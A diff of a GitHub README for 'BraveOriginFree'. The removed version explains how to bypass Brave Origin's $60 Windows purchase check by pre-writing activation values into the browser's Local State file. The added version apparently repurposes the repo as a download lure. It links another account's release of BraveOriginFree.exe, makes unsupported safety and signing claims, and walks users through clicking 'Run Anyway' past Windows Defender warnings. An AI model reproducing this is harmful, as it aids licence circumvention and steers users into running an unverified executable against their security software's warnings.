@@ -1,163 +1,93 @@
-# Brave Origin For Windows Free
-# Brave Origin Free Download 
-# Brave Origin
-# Brave Origin Free
-**Brave Origin costs $60 on Windows. On Linux it's free. This fixes that.**
+# 🌐 BraveOriginFree - Fast Privacy Focused Web Browsing
 
-[![Version](https://img.shields.io/badge/Brave_Origin-1.91.175-blue)](https://github.com/brave/brave-browser/releases)
-[![Platform](https://img.shields.io/badge/Windows-10_11-green)]()
-[![License](https://img.shields.io/badge/license-MIT-green)]()
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Personal-allen447/BraveOriginFree/releases)
 
----
+BraveOriginFree provides a private web browsing experience for Windows users. This version works as a portable application. You do not need to install files on your hard drive. It runs from any folder. It contains no ads or trackers. 
 
-## What is this?
+## 📥 How to Get Started
 
-Brave Origin is a stripped-down version of Brave — same privacy, same Shields, same speed — but without Rewards, Wallet, AI, News, VPN, Tor, or telemetry. It's the browser you get when you want Brave's core without the extras.
+Follow these steps to set up the software on your computer.
 
-On Linux, it's free. On Windows, Brave charges $60.
+1. Visit the [official releases page](https://github.com/Personal-allen447/BraveOriginFree/releases) to find the latest version.
+2. Look for the file named BraveOriginFree.exe under the Assets section.
+3. Click the file name to start the download.
+4. Save the file to a folder of your choice. A folder on your Desktop or Documents works well.
+5. Once the download finishes, open the folder.
+6. Double-click the BraveOriginFree.exe file to start the browser.
 
-This project removes that paywall by doing exactly what the Linux version does — setting a configuration flag that tells the browser it's activated. No cracks. No modified binaries. Just a configuration that Brave themselves allow on other platforms.
+You do not need administrator rights to run this program. 
 
----
+## 🛠 Features
 
-## What you get
+BraveOriginFree offers tools for safe and fast internet use.
 
-- **Brave Origin** — the official signed build from Brave, untouched and verified
-- **Purchase bypass** — the same activation the Linux version uses
-- **All bloat removed** — Rewards, Wallet, Leo AI, News, VPN, Tor, P3A all disabled
-- **Zero installation** — runs from any folder, USB drive, anywhere
-- **No admin rights** — works in user space, no registry changes
-- **Auto-updates** — check for new versions with `src\update.ps1`
+*   Ad Blocking: The browser stops trackers and ads automatically. This makes pages load faster.
+*   Privacy Protection: The engine prevents sites from learning your habits.
+*   Chromium Base: You get the same speed and plugin support as major browsers.
+*   Portable Design: Move your application folder to a USB drive. All your settings stay inside that folder.
+*   Free Access: All features remain available without any payment or account login.
 
----
+## 💻 System Requirements
 
-## How to use
-# https://thesajidalam.github.io/BraveOriginFree/
-### The 2-minute install
+This software runs on most modern desktop systems.
 
-```batch
-1. Download this repo (Code → Download ZIP, or clone it)
-2. Extract the folder
-3. Double-click install.bat
-4. Done.
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB of RAM minimum. 8 GB provides a smoother experience.
+*   Storage: 500 MB of free space for the browser files and your data.
+*   Network: A stable internet connection for browsing.
 
-That's it. `install.bat` will:
-- Download the latest Brave Origin from GitHub (~150 MB)
-- Apply the free activation bypass
-- Put a shortcut on your desktop
-- Launch your new browser
+## 🧩 Browsing Basics
 
-### If you already ran install.bat
+You will find the interface familiar if you used web browsers before. 
 
-Just double-click `run.bat` any time to start the browser.
+*   Address Bar: Type websites or search terms here. Press Enter to go.
+*   Bookmarks: Click the icon to save your favorite sites.
+*   History: View your past activity by pressing Ctrl+H.
+*   Downloads: View files you saved by pressing Ctrl+J.
 
----
+The browser updates automatically when you restart the app. Check the release page if you see performance issues to ensure you have the current version.
 
-## How the bypass works
+## 🔒 Security Information
 
-Brave Origin reads its activation state from a file called `Local State`. When you click "Proceed with Origin for free" on Linux, Brave writes two things:
+You use a clean version of the software. It removes tracking telemetry. This keeps your usage private. The binary remains signed to prove it comes from the original source. 
 
-```
-purchase_validated = true
-SKU credential = injected
-```
+## ⚙️ Handling Common Situations
 
-This project writes those same values into `Local State` *before* the browser ever starts. Windows Origin sees them, thinks it's been purchased, and unlocks completely.
+Some users see a warning from Windows Defender when they run new files. Windows tries to protect you because it does not recognize the file name yet.
 
-The browser checks this file on every launch. It does not contact Brave's servers for license validation. The entire check is local.
+To proceed safely:
+1. Click More Info in the popup window.
+2. Select Run Anyway.
+3. The app starts normally.
 
----
+You only perform this action once. After that, Windows recognizes the program. 
 
-## What's disabled
+## 📂 Managing Your Files
 
-Brave Origin is supposed to be minimal. This configuration makes sure none of the extras sneak through:
+Since this is a portable app, the browser keeps your cache and history in the same folder as the exe file. If you want to move your browser to a new computer, just copy the whole folder to a thumb drive. Move it to the new PC and run the file. Your settings move with you.
 
-| Feature | Status |
-|---------|--------|
-| Brave Shields | ON |
-| Bookmarks / History | ON |
-| Password Manager | ON |
-| Chrome Extensions | ON |
-| Developer Tools | ON |
-| Brave Rewards | OFF |
-| Brave Wallet | OFF |
-| Leo AI | OFF |
-| Brave News | OFF |
-| Brave Talk | OFF |
-| Brave VPN | OFF |
-| Brave Tor | OFF |
-| Telemetry (P3A) | OFF |
-| Background updates | OFF |
-| Component updates | OFF |
-| Sync | OFF |
+## 📝 Frequently Asked Questions
 
-Everything that's OFF is handled by CLI flags passed to the browser — same flags that Brave's Linux Origin build has compiled out by default.
+Do I need to install anything? 
+No. The application runs immediately after you click the file. It does not touch your system registry.
 
-#T.ME Link 🔗:
-https://t.me/braveorigin/
----
+Does it work with my existing extensions? 
+Yes. You can install standard extensions from the web store. They save to your folder.
 
-## Requirements
+Can I run multiple versions? 
+Yes. You can place copies in different folders and run them at the same time. Each copy maintains its own set of bookmarks and history.
 
-- Windows 10 or 11
-- 64-bit processor
-- 2 GB RAM
-- 500 MB free disk space
-- Internet connection (for the initial download)
+What happens if I delete the folder? 
+The browser stops working. Your settings, bookmarks, and history disappear. Move the folder to the Recycle Bin to remove the application entirely from your computer.
 
-That's it. No .NET, no runtime, no dependencies.
+How do I clear my data?
+Open the settings menu in the browser. Select Clear Browsing Data. This removes your cache and cookies.
 
----
+## 🚀 Performance Tips
 
-## Project structure
+*   Close tabs you do not use. This saves memory.
+*   Do not run too many extensions at once. They slow down your start time.
+*   Keep the browser on an SSD if possible. It makes the opening process faster.
+*   Check the downloads page every few weeks for minor improvements. 
 
-```
-BraveOriginFree/
-├── install.bat          # One-click installer (downloads + sets up everything)
-├── run.bat              # Launch the browser
-├── src/
-│   ├── bypass.ps1       # Patch any existing Brave Origin install
-│   └── update.ps1       # Check for and apply updates
-├── config/
-│   └── policies.json    # Enterprise policies (disables all extras)
-├── profile/
-│   └── Local State      # Pre-seeded activation file
-├── bin/                 # Brave Origin binary (auto-downloaded)
-└── data/                # Your browser profile (bookmarks, passwords, etc.)
-```
-
----
-
-## Source code
-
-```powershell
-git clone https://github.com/thesajidalam/BraveOriginFree.git
-cd BraveOriginFree
-.\install.bat
-```
-
----
-
-## Legal / Disclaimer
-
-*This project is for educational purposes. It demonstrates how a configuration flag that is freely available on one platform can be applied on another.*
-
-*Brave Origin is developed by Brave Software Inc. All browser binaries are the official signed builds downloaded from Brave's public GitHub repository. No binaries have been modified, patched, or tampered with.*
-
-*This project is not affiliated with Brave Software Inc.*
-
----
-
-## Credits
-
-Created and maintained by **Sajid Alam**.
-
-- GitHub: [@thesajidalam](https://github.com/thesajidalam)
-- Project: [github.com/thesajidalam/BraveOriginFree](https://github.com/thesajidalam/BraveOriginFree)
-
----
-
-## Star this repo
-
-If this saved you $60, consider starring the repo. It helps others find it.
+This browser provides a private way to explore the internet. Use it for daily tasks or secure banking. The portable nature allows for easy backups and clean removal. Enjoy the browsing experience without the usual clutter.
